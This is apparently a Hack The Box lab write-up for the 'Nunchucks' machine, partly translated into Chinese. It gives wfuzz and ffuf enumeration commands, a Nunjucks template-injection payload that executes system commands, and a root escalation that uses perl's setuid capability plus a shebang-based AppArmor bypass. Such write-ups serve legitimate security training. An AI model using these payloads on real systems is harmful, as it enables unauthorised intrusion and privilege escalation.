1, nmap scan
22/tcp ssh
80/tcp http
443/tcp ssl/http

2, enumerate sub-domain
Because of no useful information, we can also find some sub-domain of this website
wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb

we can find "store.nunchucks.htb"

3, enumerate the website 
![](images/Pasted%20image%2020240720090328.png)
It is clear that registration is closed.
So try to find something useful in the fuzzing the web-contents.
 ffuf -u https://nunchucks.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fs 45

/login /privacy /signup /terms /asserts
maybe /login could have the sql-injection
from Wappalyzer, we can get this website is powered by node-js and express,it always use no-sql databases with it.
So try some typical no-sql injection payload:(fail)

Let's enumerate the web of store.nunchucks.htb
 ffuf -u https://store.nunchucks.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fs 45
We only find the /asserts
So try to find some hints from the index page
There is a POST request from the email submit,let's exploit it by using burpsuite
![](images/Pasted%20image%2020240720092923.png)
Successfully identity the SSTI ! (nunchucks template injection)
pyload:
 {"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@qq.com1"}

of course, we can get user.txt and make our ssh file
finally we successfully login into the server 
ssh david@10.10.11.122

4, Shell as root
we can upload the tool pspy64 to help us to find something in the background

as root 
/bin/sh /usr/lib/apt/apt.systemd.daily lock_is_held install

also we find something interesting in the /opt/backup.pl

use POSIX qw(setuid); 
POSIX::setuid(0);

But since only root can write to /opt/web_backups, it’s using POSIX::setuid(0) to run as root.
To do this, it must either be SUID or have a capability. It has the setuid capability:

getcap /usr/bin/perl
/usr/bin/perl = cap_setuid+ep

So we want to try to get root shell straightly
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
but it didnot work!
but exec "id" get uid=0(root) gid=1000(david) groups=1000(david)

Apparmor is a way to define access controls much more granularly to various binaries in Linux. There are a series of binary-specific profiles in /etc/apparmor.d
there is a specific for usr.bin.perl

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

so we could not straightly by /usr/bin/perl

but we can try  write it into scipts:

There’s two common ways to start a script on Linux. The first is to call the interpreter (bash, python, perl) and then give it the script as an argument. This method will apply AppArmor protections as expected.
在 Linux 上启动脚本有两种常见方法。第一种是调用解释器（ bash 、 python 、 perl ），然后将脚本作为参数提供给它。此方法将按预期应用 AppArmor 保护。

The other is using a Shebang (#!) and setting the script itself to executable. When Linux tries to load the script as executable, that line tells it what interpreter to use. For some reason, the AppArmor developers don’t believe that the rules for the interpreter should apply there, and so they don’t.
另一种是使用 Shebang ( #! ) 并将脚本本身设置为可执行文件。当 Linux 尝试将脚本加载为可执行文件时，该行会告诉它要使用哪个解释器。由于某种原因，AppArmor 开发人员认为解释器的规则不应该适用于此，因此他们不这样做。

That means if I just run ./shell.pl, it works and we get root shell.